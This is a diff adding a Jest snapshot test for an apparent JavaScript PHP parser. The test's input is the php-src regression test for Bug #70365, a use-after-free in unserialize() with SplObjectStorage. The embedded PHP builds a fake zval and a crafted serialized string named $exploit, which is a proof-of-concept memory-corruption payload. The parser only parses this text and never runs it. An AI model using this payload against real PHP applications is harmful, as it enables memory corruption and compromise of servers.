@@ -1,0 +1,9 @@
+// eslint-disable prettier/prettier
+const parser = require("../main");
+
+describe("php-src tests", function () {
+  // ext/spl/tests/bug70365.phpt
+  it("SPL: Bug #70365 use-after-free vulnerability in unserialize() with SplObjectStorage", function () {
+    expect(parser.parseCode("<?php\nclass obj {\n    var $ryat;\n    function __wakeup() {\n        $this->ryat = 1;\n    }\n}\n$fakezval = ptr2str(1122334455);\n$fakezval .= ptr2str(0);\n$fakezval .= \"\\x00\\x00\\x00\\x00\";\n$fakezval .= \"\\x01\";\n$fakezval .= \"\\x00\";\n$fakezval .= \"\\x00\\x00\";\n$inner = 'x:i:1;O:8:\"stdClass\":0:{},i:1;;m:a:0:{}';\n$exploit = 'a:5:{i:0;i:1;i:1;C:16:\"SplObjectStorage\":'.strlen($inner).':{'.$inner.'}i:2;O:3:\"obj\":1:{s:4:\"ryat\";R:3;}i:3;R:6;i:4;s:'.strlen($fakezval).':\"'.$fakezval.'\";}';\n$data = unserialize($exploit);\nvar_dump($data);\nfunction ptr2str($ptr)\n{\n    $out = '';\n    for ($i = 0; $i < 8; $i++) {\n        $out .= chr($ptr & 0xff);\n        $ptr >>= 8;\n    }\n    return $out;\n}\n?>")).toMatchSnapshot();
+  });
+});
